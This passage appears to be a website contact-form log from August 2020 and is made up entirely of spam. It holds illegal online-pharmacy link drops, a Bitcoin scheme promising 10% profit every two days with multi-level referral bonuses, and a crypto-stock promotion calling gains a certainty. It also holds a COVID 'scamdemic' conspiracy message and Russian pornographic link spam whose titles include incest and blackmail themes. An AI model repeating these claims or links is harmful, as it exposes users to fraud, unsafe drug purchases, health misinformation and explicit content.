HIVE Blockchain has gone up since we last shared this, this is a company that mines cryptocurrencies (inflation hedge) and with Bitcoin and Ethereum going to go up in prices, any price you buy under CAD$1 per stock of Hive Block Chain is a bargain! We recommend you wait until it crosses it's all time high of CAD$5.37 on 3rd Nov 2017! (since it became a crypto mining company.

Also, please share what is coming (big inflation) with as many people as possible! Secure your future for your family and yourself! The economic situation is likely to worsen before it recovers in a few years.


PS: I know this is not the best way to reach you but I am doing this with the hope of helping as many people as possible. I am currently spending money out of my own pockets (without selling anything in return).

Please spend some time to think about what is coming. Do check this documentary out: https://www.youtube.com/watch?v=DyV0OfU3-FU

We are not affiliated to HIVE BLOCKCHAIN in any way.


Disclaimer: This is not financial advice and we own some Hive Blockchain. We are living in extreme times when the Fed and all central banks around the world is printing lots of currencies. It is a mathematical certainity that everything will go up in price due to the excessive currency printing. We believe cryptocurrencies have more room to go up in  prices when the water lifts all boats. Do your own research on this and prepare for the worst
+++ 2020-08-12 12:15:50 PM -- Email from: Wimskels, -- subject: uoxdtbwn, -- email: caliglenn1@yahoo.com, -- Message is: &lt;a href=&quot;http://cytotec100.com/&quot;&gt;cytotec 200 mcg tabs&lt;/a&gt;
+++ 2020-08-13 10:17:24 AM -- Email from: JamesKip, -- subject: Google Analytics for Beginners: Tips &amp; Tricks in 2020 [Live Webinar], -- email: bee.pannell7184@gmail.com, -- Message is: Are you overwhelmed by Google Analytics? 
Wednesday at 1 PM (Pacific Time) I will teach you how to quickly navigate through Google Analytics to find important information about your audience. 
I will show you how to optimize your Analytics data to help make better-informed marketing decisions. 
Signup here to get the webinar link https://www.eventbrite.com/e/113064165964
+++ 2020-08-13 09:35:53 PM -- Email from: RobertJeK, -- subject: Fever screening thermal CCTV camera and medical masks, -- email: atrixxtrix@gmail.com, -- Message is: Dear Sir/mdm, 
 
How are you? 
 
We supply Professional surveillance &amp; medical products: 
 
Moldex, makrite and 3M N95 1860, 9502, 9501, 8210 
3ply medical, KN95, FFP2, FFP3, PPDS masks 
Face shield/medical goggles 
Nitrile/vinyl/Latex/PP gloves 
Isolation/surgical gown lvl1-4 
Protective PPE/Overalls lvl1-4 
IR non-contact/oral thermometers 
sanitizer dispenser 
 
Logitech/OEM webcam 
Marine underwater CCTV 
Explosionproof CCTV 
4G Solar CCTV 
Human body thermal cameras 
IP &amp; analog cameras for homes/industrial/commercial 
 
Let us know which products you are interested and we can send you our full pricelist. 
 
Whatsapp: +65 87695655 
Telegram: cctv_hub 
Skype: cctvhub 
Email: sales@thecctvhub.com 
W: http://www.thecctvhub.com/ 
 
If you do not wish to receive email from us again, please let us know by replying. 
 
regards, 
CCTV HUB
+++ 2020-08-14 01:19:32 AM -- Email from: Jess Sells, -- subject: COVID-1984: The Scamdemic That Is Being Used to Destroy Your Livelihood and Business, -- email: jess.sells@hotmail.com, -- Message is: This Google doc exposes how this scamdemic is part of a bigger plan to crush your business and keep it closed or semi-operational (with heavy rescritions) while big corporations remain open without consequences. This Covid lie has ruined many peoples lives and businesses and is all done on purpose to bring about the One World Order. It goes much deeper than this but the purpose of this doc is to expose the evil and wickedness that works in the background to ruin peoples lives. So feel free to share this message with friends and family. No need to reply to the email i provided above as its not registered. But this information will tell you everything you need to know. https://docs.google.com/document/d/1ogQqKrmP0Dzga6xvMp5zA6n-WLKx0mp-laETDTVe4Dw/edit
+++ 2020-08-14 01:39:53 PM -- Email from: Ugoskels, -- subject: itygdrkn, -- email: marvinsaunders@gmail.com, -- Message is: &lt;a href=&quot;http://gabapentin.us.com/&quot;&gt;prescription gabapentin 300 mg&lt;/a&gt; &lt;a href=&quot;http://albenzamed.com/&quot;&gt;albenza pinworms&lt;/a&gt; &lt;a href=&quot;http://prednisolone911.com/&quot;&gt;prednisolone cheap&lt;/a&gt; &lt;a href=&quot;http://phenergan125.com/&quot;&gt;phenergan otc usa&lt;/a&gt; &lt;a href=&quot;http://prazosin.us.com/&quot;&gt;prazosin 2 mg capsule&lt;/a&gt; &lt;a href=&quot;http://inderal.us.com/&quot;&gt;inderal 120&lt;/a&gt; &lt;a href=&quot;http://cialis5.com/&quot;&gt;generic cialis online usa&lt;/a&gt;
+++ 2020-08-15 12:28:09 AM -- Email from: PORNOgov, -- subject: Бесплатное Адалт Видео в HD, -- email: sikasova@mail.ru, -- Message is: Смотрите порнушка видео в офигенном качестве, оцените бесплатно: https://porno-go.top 
Жгучее секс видео без регистрации смотреть на https://porno-go.top/porno-vecherinki-i-studenty/3766-nastoyaschaya-porno-vecherinka-molodyh-studentov-v-zagorodnom-dome..html в высоком качестве 
Чувственное порно видео для взрослых онлайн на https://porno-go.top/amature/8564-moloduha-ublazhaet-v-vannoy-tolstogo-lyubovnika.html в HD1080 
Горячее секс съемка без границ просмотр на https://porno-go.top/hd-porno/3265-goryachaya-zadnica-molodenkoy-dzheyd-vyglyadit-slovno-sochnyy-persik..html в HD1080 
Нежное порно фильмы для всех онлайн на https://porno-go.top/squirt/5426-russkaya-devchonka-reshila-poprobovat-skvirt-so-svoim-drugom.html в HD1080 
Жесткое секс видео для взрослых просмотр на https://porno-go.top/minet/8336-tolko-minet-i-nikakogo-proniknoveniya.html в HD720 
Реальное порнушка видео в офигенном качестве, наслаждайтесь бесплатно: https://porno-go.ru 
Жгучее порно запись без регистрации просмотр на https://porno-go.top/big-dik/4588-krasivyy-seks-s-latinkoy-i-bolshim-chlenom.html в HD720 
Шикарное секс запись бесплатно смотреть на https://porno-go.top/lesbi/6956-sestry-lesbiyanki-ispolnyayut-orgazmy-na-krovati.html в HD1080 
Вип порно видео для всех онлайн на https://porno-go.top/uprugie-siski/9425-molodenkaya-mulatka-obozhaet-strastnuyu-i-derzkuyu-eblyu.html в высоком качестве 
Со всего мира порно съемка бесплатно онлайн на https://porno-go.top/anal/9092-ispytal-na-popke-devushki-vse-chto-bylo-narisovano-na-doske-za-ee-spinoy.html в HD1080 
Чувственное порно видео для всех онлайн на https://porno-go.top/hd-porno/5192-povelas-na-shantazh-brata-i-sdelav-minet-potrahalas-s-nim-na-krovati.html в HD1080 
Горячее секс ролики для взрослых онлайн на https://porno-go.top/britye-kiski/704-moloduyu-russkuyu-devochku-derut-vo-vse-scheli.html в HD1080 
Со всего мира порно запись без границ онлайн на https://porno-go.top/hd-porno/4916-paren-trahnul-podrugu-svoey-mamy.html в HD720
+++ 2020-08-15 02:21:14 AM -- Email from: Rachel Florent, -- subject: surprising, -- email: rachel.florent@videomarketingnow.xyz, -- Message is: Hey, 

You have a lot going on right now, but maybe we can help?

We make professional videos for businesses to put on their websites.

See examples of what we can do for you:
https://www.videomarketingnow.xyz/success/?=esyray.com

These videos are helping businesses GROW right now, at a time when they need it most.

Rachel Florent
Custom Video Specialist





410 Santa Clara St. East, Unit 817	
San Jose,	CA 95113
 
No more video marketing:
https://thevideonetwork.top/out.php/?site=esyray.com
+++ 2020-08-15 03:08:46 AM -- Email from: Nicole Rideout, -- subject: Important Reminder, -- email: nicole@alexadirectory.top, -- Message is: Hey! 

Have you remembered to activate voice search for your business?

Activate it here in 30 seconds:

https://alexadirectory.top/abcc1/?=esyray.com

Without activation, customers may not be able to find esyray.com with voice searches on Google, Amazon Alexa or mobile phones.

Nicole Ritter
Voice Activation Follow-up Specialist














 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://alexadirectory.top/out.php?site=esyray.com
+++ 2020-08-15 11:32:37 AM -- Email from: Wimskels, -- subject: lyptlnqp, -- email: redbarron026@aol.com, -- Message is: &lt;a href=&quot;http://estrace2.com/&quot;&gt;estrace tablets uk&lt;/a&gt;
+++ 2020-08-16 10:58:54 AM -- Email from: Booskels, -- subject: dceglxvj, -- email: woody10@mail.com, -- Message is: &lt;a href=&quot;http://finpecia911.com/&quot;&gt;finpecia tablet price in india&lt;/a&gt; &lt;a href=&quot;http://erythromycinlab.com/&quot;&gt;where can i buy erythromycin tablets&lt;/a&gt; &lt;a href=&quot;http://chloroquineav.com/&quot;&gt;aralen 200 mg&lt;/a&gt; &lt;a href=&quot;http://prozacflx.com/&quot;&gt;prozac prices canada&lt;/a&gt; &lt;a href=&quot;http://diflucanrx.com/&quot;&gt;buy diflucan canada&lt;/a&gt; &lt;a href=&quot;http://augmentin875.com/&quot;&gt;augmentin 500mg tablet&lt;/a&gt; &lt;a href=&quot;http://amoxiltab.com/&quot;&gt;amoxil 500mg&lt;/a&gt; &lt;a href=&quot;http://lipitor2020.com/&quot;&gt;lipitor atorvastatin calcium&lt;/a&gt;
+++ 2020-08-16 12:38:34 PM -- Email from: Ashskels, -- subject: dmzosidu, -- email: slagle369@hotmail.com, -- Message is: &lt;a href=&quot;http://tadalafillil.com/&quot;&gt;tadalafil prescription cost&lt;/a&gt; &lt;a href=&quot;http://hydrochlorothiazide2.com/&quot;&gt;hydrochlorothiazide best price&lt;/a&gt; &lt;a href=&quot;http://sumycin365.com/&quot;&gt;sumycin 500 mg price in india&lt;/a&gt; &lt;a href=&quot;http://viagrasoftab.com/&quot;&gt;buy viagra soft tabs online&lt;/a&gt; &lt;a href=&quot;http://nolvadex10.com/&quot;&gt;nolvadex buy india&lt;/a&gt;
+++ 2020-08-17 09:58:02 AM -- Email from: Vernita Lu, -- subject: , -- email: vernita.lu@hotmail.com, -- Message is: Groundbreaking new way to advertise your website for Nothing! See here: https://bit.ly/ads-for-completely-free
+++ 2020-08-17 05:43:32 PM -- Email from: Michell Pettis, -- subject: , -- email: pettis.michell@gmail.com, -- Message is: Stem cell therapy has proven itself to be one of the most effective treatments for COPD (Chronic Obstructive Pulmonary Disorder). IMC is the leader in stem cell therapies in Mexico. For more information on how we can treat COPD please visit:
https://bit.ly/copd-integramedicalcenter
+++ 2020-08-18 03:20:50 PM -- Email from: Eric Jones, -- subject: Strike when the iron’s hot, -- email: eric@talkwithwebvisitor.com, -- Message is: Hey there, I just found your site, quick question…

My name’s Eric, I found esyray.com after doing a quick search – you showed up near the top of the rankings, so whatever you’re doing for SEO, looks like it’s working well.

So here’s my question – what happens AFTER someone lands on your site?  Anything?

Research tells us at least 70% of the people who find your site, after a quick once-over, they disappear… forever.

That means that all the work and effort you put into getting them to show up, goes down the tubes.

Why would you want all that good work – and the great site you’ve built – go to waste?

Because the odds are they’ll just skip over calling or even grabbing their phone, leaving you high and dry.

But here’s a thought… what if you could make it super-simple for someone to raise their hand, say, “okay, let’s talk” without requiring them to even pull their cell phone from their pocket?
  
You can – thanks to revolutionary new software that can literally make that first call happen NOW.

Talk With Web Visitor is a software widget that sits on your site, ready and waiting to capture any visitor’s Name, Email address and Phone Number.  It lets you know IMMEDIATELY – so that you can talk to that lead while they’re still there at your site.
  
You know, strike when the iron’s hot!

CLICK HERE http://www.talkwithwebvisitors.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

When targeting leads, you HAVE to act fast – the difference between contacting someone within 5 minutes versus 30 minutes later is huge – like 100 times better!

That’s why you should check out our new SMS Text With Lead feature as well… once you’ve captured the phone number of the website visitor, you can automatically kick off a text message (SMS) conversation with them. 
 
Imagine how powerful this could be – even if they don’t take you up on your offer immediately, you can stay in touch with them using text messages to make new offers, provide links to great content, and build your credibility.

Just this alone could be a game changer to make your website even more effective.

Strike when  the iron’s hot!

CLICK HERE http://www.talkwithwebvisitors.com to learn more about everything Talk With Web Visitor can do for your business – you’ll be amazed.

Thanks and keep up the great work!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – you could be converting up to 100x more leads immediately!   
It even includes International Long Distance Calling. 
Stop wasting money chasing eyeballs that don’t turn into paying customers. 
CLICK HERE http://www.talkwithwebvisitors.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitors.com/unsubscribe.aspx?d=esyray.com
+++ 2020-08-18 04:18:10 PM -- Email from: Kate Walch, -- subject: RE: interested people to your site, -- email: media.1a@tutamail.com, -- Message is: Hi,

I thought you might be interested in our services. 

Would you like thousands of interested people coming to your website every day? 
People will come to you from major online publications in your EXACT niche.

We match your website to the sources for your approval before your campaign is run.
We are the only service that does this. 

Starter campaigns of 5,000 niche people to your site is $54.99.

For more info please visit us at https://traffic-stampede.com

Thank you for your time and hope to see you there.

Best,
Kate
TS
Since 2005
+++ 2020-08-18 11:38:51 PM -- Email from: Booskels, -- subject: wngzaulh, -- email: alan@hotmail.com, -- Message is: &lt;a href=&quot;http://dapoxetine911.com/&quot;&gt;dapoxetine premature ejaculation&lt;/a&gt; &lt;a href=&quot;http://cymbaltarx.com/&quot;&gt;cymbalta online pharmacy price&lt;/a&gt; &lt;a href=&quot;http://paxil10.com/&quot;&gt;cheapest paxil online&lt;/a&gt; &lt;a href=&quot;http://seroquel50.com/&quot;&gt;buy seroquel online australia&lt;/a&gt; &lt;a href=&quot;http://prednisolone911.com/&quot;&gt;prednisolone 5mg for sale in uk&lt;/a&gt;
+++ 2020-08-19 08:21:08 AM -- Email from: Jimmy Scowley, -- subject: Ready-made scale models of World of Tanks, -- email: jimmyscowley@gmail.com, -- Message is: Dear Sir/mdm, 
 
Our company Resinscales is looking for distributors and resellers for its unique product: ready-made tank models from the popular massively multiplayer online game - World of Tanks. 
 
Such models are designed for fans of the game WoT and collectors of military models. 
 
What makes our tank models stand out? 
 
- We are focusing on tanks not manfactured by any companies, therefore we have no competitors 
- Accurately made in 1/35 scale 
- Very high accuracy of details and colors 
- The price of the model tank is the same as the production cost 
 
If you are interested to be our distributor/reseller then please let us know from the contacts below. 
 
https://www.resinscales.com/ 
https://www.facebook.com/resinscales.models/ 
contact@resinscales.com 
 
Ignore this message if it had been wrongly sent to you.
+++ 2020-08-19 12:29:32 PM -- Email from: Francis Jamieson, -- subject: Voice search, -- email: francis.jamieson@newalexabusinessdirectory.top, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://newalexabusinessdirectory.top/abcc1/?=esyray.com


 

 
Francis















 
1 7 1 Passaic str eet, Garf eld NJ 0 7 0 2 6

You can skip future marketing messages here:
https://newalexabusinessdirectory.top/out.php?site=esyray.com
+++ 2020-08-19 12:44:56 PM -- Email from: Hattie Tanner, -- subject: Uncertain times, -- email: hattie.tanner@supervideomarketing.top, -- Message is: Hi – I hope you and your family are doing well!

Could your business benefit from a custom-made video right now?

Here's how we can help:
https://www.supervideomarketing.top/success/?=esyray.com


It's a very effective way to convert new customers, especially during these uncertain times!

Be well,
Hattie








- This commercial message sent from PJLK Marketing LC
410 E Santa Clara St. RBLD#817
San Jose, CA 95113

To unsubscribe click here:
https://supervideomarketing.top/out.php/?site=esyray.com
+++ 2020-08-19 01:53:22 PM -- Email from: Ripal Patel, -- subject: Your search of Designer end here!, -- email: ripalpatel06@protonmail.com, -- Message is: Hello there,I'm 25 years old Web Designer and Developer living on Earth. 
If you are looking for a Website design or Wordpress Expert, I Can! 
Checkout my portfolio below @ https://theripal.com/portfolio/ 
I believe that the world needs better freelancers that are willing to do quality work on a reliable budget. If you are looking for a Website design or WordPress expert, then I AM HERE! 
Have a good day! 
Kind Regards 
-- 
Ripal Patel | Website Designer 
w: http://www.theripal.com/ | e: ripalpatel06@protonmail.com
+++ 2020-08-19 08:43:45 PM -- Email from: DavidNesee, -- subject: Get likes and followers, -- email: abelbreath456@gmail.com, -- Message is: Looking for Facebook likes or Instagram followers? 
We can help you. Please visit https://1000-likes.com/ to place your order.
+++ 2020-08-20 04:20:43 AM -- Email from: Wimskels, -- subject: rxymrkgw, -- email: redbarron026@mail.com, -- Message is: &lt;a href=&quot;http://baclofenp.com/&quot;&gt;baclofen 500 mg&lt;/a&gt;
+++ 2020-08-20 05:21:52 PM -- Email from: Ugoskels, -- subject: bfeiljvp, -- email: lebeaulier@mail.com, -- Message is: &lt;a href=&quot;http://finasteridealop.com/&quot;&gt;buy finasteride online&lt;/a&gt; &lt;a href=&quot;http://chydroxychloroquine.com/&quot;&gt;hydroxychloroquine 200 mg tablet&lt;/a&gt; &lt;a href=&quot;http://tetracyclinecaps.com/&quot;&gt;tetracycline 324&lt;/a&gt; &lt;a href=&quot;http://advair2019.com/&quot;&gt;buy advair cheap&lt;/a&gt;
+++ 2020-08-20 07:27:22 PM -- Email from: Josephtwife, -- subject: АДВОКАТ ПО ГРАЖДАНСКИМ ДЕЛАМ, -- email: bazhenovolegjvi@mail.ru, -- Message is: | 
&lt;a href=https://obyava.ua/ru/advokat-yurist-konsultaciya-besplatno-zaporozhe-2235394.html&gt;МЕЛИТОПОЛЬСКИЙ ГОРРАЙОННЫЙ СУД ЗАПОРОЖСКОЙ ОБЛАСТИ&lt;/a&gt;
+++ 2020-08-21 03:36:04 AM -- Email from: Ashskels, -- subject: ablytsjn, -- email: aboomar001@mail.com, -- Message is: &lt;a href=&quot;http://kamagra911.com/&quot;&gt;where can i buy kamagra with paypal&lt;/a&gt; &lt;a href=&quot;http://sildenafilv.com/&quot;&gt;sildenafil 100mg canada&lt;/a&gt; &lt;a href=&quot;http://avodart24.com/&quot;&gt;avodart 0.5&lt;/a&gt; &lt;a href=&quot;http://viagrasoftab.com/&quot;&gt;online viagra soft&lt;/a&gt; &lt;a href=&quot;http://zofranondansetron.com/&quot;&gt;zofran generic brand&lt;/a&gt; &lt;a href=&quot;http://fluoxetinetb.com/&quot;&gt;buy fluoxetine 10 mg&lt;/a&gt; &lt;a href=&quot;http://cytotec100.com/&quot;&gt;cytotec 200 mcg tablet&lt;/a&gt;
+++ 2020-08-21 12:51:03 PM -- Email from: Ashskels, -- subject: dwcxciut, -- email: bmunoz1@gmail.com, -- Message is: &lt;a href=&quot;http://cephalexin911.com/&quot;&gt;cephalexin from mexico&lt;/a&gt; &lt;a href=&quot;http://atenolol25.com/&quot;&gt;atenolol 40 mg price&lt;/a&gt; &lt;a href=&quot;http://motilium10mg.com/&quot;&gt;where to buy motilium online&lt;/a&gt; &lt;a href=&quot;http://ivaltrex.com/&quot;&gt;australia price for valtrex&lt;/a&gt;
+++ 2020-08-22 05:31:33 AM -- Email from: Wimskels, -- subject: fzmbozqi, -- email: punisher2002gh@outlook.com, -- Message is: &lt;a href=&quot;http://ivaltrex.com/&quot;&gt;valtrex without insurance&lt;/a&gt;
+++ 2020-08-22 05:58:23 AM -- Email from: Erwin Sly, -- subject: The perfect way to diversify your income..., -- email: erwin.sly@gmail.com, -- Message is: Hi fellow entrepreneur,

Did you know that 95% of people who try forex trading fail?

Yep. It’s the horrible truth. The main reasons why they fail are:-

- They learn the free stuff straight off Google
- They don’t know how to manage their risk
- They expect a get rich quick ‘overnight success’

The amazing news is I’ve created a brand new masterclass video which shows you exactly how to solve all these problems - fast, easy and most importantly - for FREE!

Click Here Right Now To See It.
https://bit.ly/freedom-by-forex-masterclass

I’ll see you over there.

Thanks,

Hither Mann
Founder &amp; CEO Fortune Academy

P.S. No business should ever put all their eggs in one basket. This training will open your eyes to what’s possible in the world of FX trading and I'm sure you will never look back.

P.P.S. If you haven’t got the slightest clue about forex trading, don’t worry this is even better for you as I’ll be covering everything you need to know starting from scratch.
--
+++ 2020-08-23 10:18:02 PM -- Email from: Mathew Minter, -- subject: , -- email: minter.mathew@gmail.com, -- Message is: Promote your site free here!: http://www.zero-cost-forever-ads.xyz
+++ 2020-08-24 10:42:59 AM -- Email from: Mike, -- subject: New: DA50 for esyray.com, -- email: no-replytam@google.com, -- Message is: Hi there 
If you want to get ahead of your competition, have a higher Domain Authority score. Its just simple as that. 
With our service you get Domain Authority above 50 points in just 30 days. 
 
This service is guaranteed 
 
For more information, check our service here 
https://www.monkeydigital.co/Get-Guaranteed-Domain-Authority-50/ 
 
thank you 
Mike  
Monkey Digital 
support@monkeydigital.co
+++ 2020-08-24 11:21:45 AM -- Email from: Juliann Tolmie, -- subject: Get esyray.com approved in the Google News, -- email: juliann.tolmie@msn.com, -- Message is: hi there

Do you want to increase your business revenue while improving your SEO and ranks for your website?

Get approved in the GOOGLE News for esyray.com and start getting the traffic and visibility that you need.

Read more
https://www.ghostdigital.co/google-news-listing/

Best Regards
Ghost Digital Team
+++ 2020-08-24 11:27:03 AM -- Email from: Ugoskels, -- subject: kvpnzwqv, -- email: semajskroy@outlook.com, -- Message is: &lt;a href=&quot;http://buspar24.com/&quot;&gt;can i buy buspar online&lt;/a&gt; &lt;a href=&quot;http://ivermectin3.com/&quot;&gt;ivermectin 1 cream generic&lt;/a&gt;
+++ 2020-08-24 12:52:19 PM -- Email from: JimmyLog, -- subject: Short-term Bitcoin investments. Investment period is 2 days. Minimum profit is 10%, -- email: turbomavro@gmail.com, -- Message is: The leader in short-term investing in the cryptocurrency market.   
The leader in payments for the affiliate program.   
 
 
Investment program: 
 
Investment currency: BTC. 
The investment period is 2 days. 
Minimum profit is 10% 
 
Registration here:  https://bit.ly/3gr3l6q     
 
Get + 10% every 2 days to your personal Bitcoin wallet in addition to your balance. 
 
For example: invest 0.1 bitcoins today, in 2 days you will receive 0.11 bitcoins in your personal bitcoin wallet. 
 
 
The best affiliate program - a real find for MLM agents   
 
5% for the referral of the first level (direct registration) 
3% for the referral of the second level 
1% for the referral of the third level 
 
Referral bonuses are paid the next day after the referral donation. 
The bonus goes to your BTC address the day after the novice's donation. 
Any reinvestment of participants, the leader receives a full bonus! 
 
Registration here:  https://bit.ly/3gr3l6q 
+++ 2020-08-24 05:43:48 PM -- Email from: Eric Jones, -- subject: Strike when the iron’s hot, -- email: eric@talkwithwebvisitor.com, -- Message is: Hey there, I just found your site, quick question…

My name’s Eric, I found esyray.com after doing a quick search – you showed up near the top of the rankings, so whatever you’re doing for SEO, looks like it’s working well.

So here’s my question – what happens AFTER someone lands on your site?  Anything?

Research tells us at least 70% of the people who find your site, after a quick once-over, they disappear… forever.

That means that all the work and effort you put into getting them to show up, goes down the tubes.

Why would you want all that good work – and the great site you’ve built – go to waste?

Because the odds are they’ll just skip over calling or even grabbing their phone, leaving you high and dry.

But here’s a thought… what if you could make it super-simple for someone to raise their hand, say, “okay, let’s talk” without requiring them to even pull their cell phone from their pocket?
  
You can – thanks to revolutionary new software that can literally make that first call happen NOW.

Talk With Web Visitor is a software widget that sits on your site, ready and waiting to capture any visitor’s Name, Email address and Phone Number.  It lets you know IMMEDIATELY – so that you can talk to that lead while they’re still there at your site.
  
You know, strike when the iron’s hot!

CLICK HERE http://www.talkwithwebvisitors.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

When targeting leads, you HAVE to act fast – the difference between contacting someone within 5 minutes versus 30 minutes later is huge – like 100 times better!

That’s why you should check out our new SMS Text With Lead feature as well… once you’ve captured the phone number of the website visitor, you can automatically kick off a text message (SMS) conversation with them. 
 
Imagine how powerful this could be – even if they don’t take you up on your offer immediately, you can stay in touch with them using text messages to make new offers, provide links to great content, and build your credibility.

Just this alone could be a game changer to make your website even more effective.

Strike when  the iron’s hot!

CLICK HERE http://www.talkwithwebvisitors.com to learn more about everything Talk With Web Visitor can do for your business – you’ll be amazed.

Thanks and keep up the great work!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – you could be converting up to 100x more leads immediately!   
It even includes International Long Distance Calling. 
Stop wasting money chasing eyeballs that don’t turn into paying customers. 
CLICK HERE http://www.talkwithwebvisitors.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitors.com/unsubscribe.aspx?d=esyray.com
+++ 2020-08-25 02:09:02 AM -- Email from: Wimskels, -- subject: qqnsijrc, -- email: jeraldine@yahoo.com, -- Message is: &lt;a href=&quot;http://clonidinenorx.com/&quot;&gt;clonidine 50 mcg&lt;/a&gt;
+++ 2020-08-25 04:05:48 AM -- Email from: Freeman Haywood, -- subject: I was visiting esyray.com, -- email: haywood.freeman@outlook.com, -- Message is: Hello,  I was just looking at your website esyray.com over and
thought I would message you on your contact form and offer
some help. I really like your site but I noticed you weren’t getting a
lot of traffic and your Alexa ranking isn’t as strong as it could be.

https://monthlytraffic.xyz

Fortunately, I may have an answer for you. I can get you 1,000’s of
visitors looking at esyray.com ready to buy your product, service or
sign up for an offer and fast. Our advertising network of over 9000
websites provides a low cost and effective online marketing solutions
that actually works. I can help your business get more online quality
traffic by advertising your business on websites that are targeted to
your specific market. The Internet is vast but you don’t have to spend
huge amounts of cash to jump start your business. I can get you 10,000
highly targeted visitors directly to your website for as little as
$49.00 for a 30 day trial run.

It has taken us 12 years to perfect our system and in addition to
being exciting, it works!! 

If you would like to talk personlly or have any questions please stop
by and chat with me on my website.

Best Regards,
Monthly Traffic Club
https://monthlytraffic.xyz
+++ 2020-08-25 06:30:16 PM -- Email from: Andres Hillard, -- subject: andres.hillard@gmail.com, -- email: andres.hillard@gmail.com, -- Message is: Want to submit your ad on tons of online ad sites every month? Pay one low monthly fee and get almost endless traffic to your site forever!

For details check out: http://www.permanent-web-links.xyz
+++ 2020-08-26 01:00:48 AM -- Email from: Olivia Johnson, -- subject: Upcoming inflation (loss of your purchasing power). Protect your family and yourself!, -- email: no-reply@nooooo-reply.com, -- Message is: Gd'Day Mate!

The Fed (with all central banks) has already mentioned there will be stimulus for years and years.

Proof:
https://edition.cnn.com/2020/06/10/economy/federal-reserve-june-meeting/index.html

What this means for you?

Currency printed is NOT wealth, real wealth is what we produce (in terms and goods and services) and exchanged for currency (a measure of your productivity). Currency is used to store your economic energy (savings) and used whenever you exchange currency (your bank balance) for goods and services for consumption (your utility from making purchases).

When the central banks keep printing and the GDP of the economy doesn't increase, what happens:

1. General prices of goods and services go up (your loss of purchasing power)
2. Interest rates of banks are low (your savings in your bank cannot yield interest rate high enough to offset the inflation rate.
3. The rich (those with excess capital to deploy) will invest in businesses, stock markets and real estate) to get better yield on their currencies.
4. But due to Covid19, there are very few businesses or industries that are doing well, as such, more capital is sent to equity markets.

If you do not do anything to protect yourself, your savings in the banks are guaranteed to lose their value.

Solution?
1. Educate yourself and understand how the financial system work and make better decision!
2. We recommend you watch this entire series of &quot;Hidden Secrets of Money&quot; for free on Youtube
https://www.youtube.com/watch?v=DyV0OfU3-FU
3. Buy physical gold and silver (this is real money) to offset the effects of inflation
4. Buy gold and silver mining stocks (gold and mining stocks go up faster than the rate of increase of the spot price of gold and silver (warning: the reverse is also true!)
5. Buy cryptocurrencies (we will be sharing more on this later!)
6. Check out HIVE Blockchain listed on Canada's Toronto Stock Exchange

HIVE Blockchain has gone up since we last shared this, this is a company that mines cryptocurrencies (inflation hedge) and with Bitcoin and Ethereum going to go up in prices, any price you buy under CAD$1 per stock of Hive Block Chain is a bargain! We recommend you wait until it crosses it's all time high of CAD$5.37 on 3rd Nov 2017! (since it became a crypto mining company.

Also, please share what is coming (big inflation) with as many people as possible! Secure your future for your family and yourself! The economic situation is likely to worsen before it recovers in a few years.


PS: I know this is not the best way to reach you but I am doing this with the hope of helping as many people as possible. I am currently spending money out of my own pockets (without selling anything in return).

Please spend some time to think about what is coming. Do check this documentary out: https://www.youtube.com/watch?v=DyV0OfU3-FU

We are not affiliated to HIVE BLOCKCHAIN in any way.


Disclaimer: This is not financial advice and we own some Hive Blockchain. We are living in extreme times when the Fed and all central banks around the world is printing lots of currencies. It is a mathematical certainity that everything will go up in price due to the excessive currency printing. We believe cryptocurrencies have more room to go up in  prices when the water lifts all boats. Do your own research on this and prepare for the worst
+++ 2020-08-26 08:39:58 AM -- Email from: Ashskels, -- subject: reenfhfd, -- email: tfogarty@outlook.com, -- Message is: &lt;a href=&quot;http://indocinrx.com/&quot;&gt;indocin tablets&lt;/a&gt; &lt;a href=&quot;http://prazosin.us.com/&quot;&gt;prazosin hcl for sleep&lt;/a&gt; &lt;a href=&quot;http://prednisonesr.com/&quot;&gt;how can i get prednisone&lt;/a&gt; &lt;a href=&quot;http://lipitor2020.com/&quot;&gt;cheap lipitor&lt;/a&gt; &lt;a href=&quot;http://wellbutrin24.com/&quot;&gt;cost of wellbutrin 300 mg&lt;/a&gt;
+++ 2020-08-26 09:12:24 AM -- Email from: Booskels, -- subject: vifzvlca, -- email: bk291@outlook.com, -- Message is: &lt;a href=&quot;http://disulfiram.us.com/&quot;&gt;otc disulfiram&lt;/a&gt; &lt;a href=&quot;http://lipitor2020.com/&quot;&gt;lipitor generic online pharmacy&lt;/a&gt; &lt;a href=&quot;http://ampicillin24.com/&quot;&gt;ampicillin trihydrate&lt;/a&gt; &lt;a href=&quot;http://cialis5.com/&quot;&gt;cialis buy in mexico&lt;/a&gt; &lt;a href=&quot;http://gabapentin.us.com/&quot;&gt;gabapentin 400 mg coupon&lt;/a&gt;
+++ 2020-08-26 11:54:48 AM -- Email from: DavidTruth, -- subject: http://whatsapplanding.nichesite.org/ - п»їbot whatsapp, -- email: panteleyegorin@yandex.com, -- Message is: http://whatsapplanding.is-great.org/ - chat bot for whatsapp
+++ 2020-08-27 05:07:50 AM -- Email from: Eric Jones, -- subject: Who needs eyeballs, you need BUSINESS, -- email: eric@talkwithwebvisitor.com, -- Message is: My name’s Eric and I just came across your website - esyray.com - in the search results.

Here’s what that means to me…

Your SEO’s working.

You’re getting eyeballs – mine at least.

Your content’s pretty good, wouldn’t change a thing.

BUT…

Eyeballs don’t pay the bills.

CUSTOMERS do.

And studies show that 7 out of 10 visitors to a site like esyray.com will drop by, take a gander, and then head for the hills without doing anything else.

It’s like they never were even there.

You can fix this.

You can make it super-simple for them to raise their hand, say, “okay, let’s talk” without requiring them to even pull their cell phone from their pocket… thanks to Talk With Web Visitor.

Talk With Web Visitor is a software widget that sits on your site, ready and waiting to capture any visitor’s Name, Email address and Phone Number.  It lets you know immediately – so you can talk to that lead immediately… without delay… BEFORE they head for those hills.
  
CLICK HERE http://www.talkwithwebvisitors.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

